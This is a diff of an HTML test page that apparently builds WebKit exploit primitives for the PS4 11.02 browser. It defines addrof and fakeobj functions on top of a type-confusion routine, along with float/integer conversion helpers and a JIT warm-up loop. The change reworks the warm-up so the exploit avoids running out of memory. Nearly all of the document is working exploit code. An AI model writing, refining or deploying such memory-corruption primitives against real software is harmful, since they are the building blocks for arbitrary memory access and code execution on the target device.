@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>PS4 11.02 Type Confusion Test</title>
+  <title>PS4 11.02 Type Confusion Test (OOM‑Safe)</title>
   <style>
     body { background: #000; color: #0f0; font-family: monospace; padding: 1em; }
     #log { white-space: pre-wrap; }
@@ -11,7 +11,7 @@
   </style>
 </head>
 <body>
-  <h1>PS4 WebKit 11.02 – addrof / fakeobj Test</h1>
+  <h1>PS4 WebKit 11.02 – OOM‑Safe addrof / fakeobj</h1>
   <div id="log"></div>
 
   <script>
@@ -23,7 +23,7 @@
       logDiv.appendChild(line);
     }
 
-    // ——— Your PoC + primitive definition ———
+    // ——— PoC + primitive definitions ———
     class MyFunction extends Function {
       constructor() {
         super();
@@ -42,12 +42,6 @@
     const float_arr = [1.1, 2.2, 3.3];
     const obj_arr   = [{}, {}, {}];
 
-    // warm-up JIT
-    for (let i = 0; i < 10000; i++) {
-      confuse(float_arr, new MyFunction());
-    }
-
-    // float<->int helpers
     const buf = new ArrayBuffer(16);
     const f64 = new Float64Array(buf);
     const u32 = new Uint32Array(buf);
@@ -62,19 +56,16 @@
       return f64[0];
     }
 
-    // primitives
     function addrof(obj) {
       obj_arr[0] = obj;
       let leak = confuse(float_arr, new MyFunction());
       return f2i(leak);
     }
-
     function fakeobj(addr) {
       float_arr[0] = i2f(addr);
       return confuse(obj_arr, new MyFunction());
     }
 
-    // ——— Tests ———
     function runTest(id) {
       const marker = 0x41414100 + id;
       let o = { marker };
@@ -94,10 +85,22 @@
       }
     }
 
-    // run 5 rounds
-    for (let i = 1; i <= 5; i++) {
-      setTimeout(() => runTest(i), i * 100);
+    // ——— OOM‑Safe warm‑up ———
+    {
+      log("Warming up JIT (2 000 iterations)…", 'ok');
+      let f = new MyFunction();
+      for (let i = 0; i < 2000; i++) {
+        confuse(float_arr, f);
+      }
+      log("Warm‑up complete.", 'ok');
     }
+
+    // give the GC a moment, then run tests
+    setTimeout(() => {
+      for (let i = 1; i <= 5; i++) {
+        runTest(i);
+      }
+    }, 100);
   </script>
 </body>
 </html>
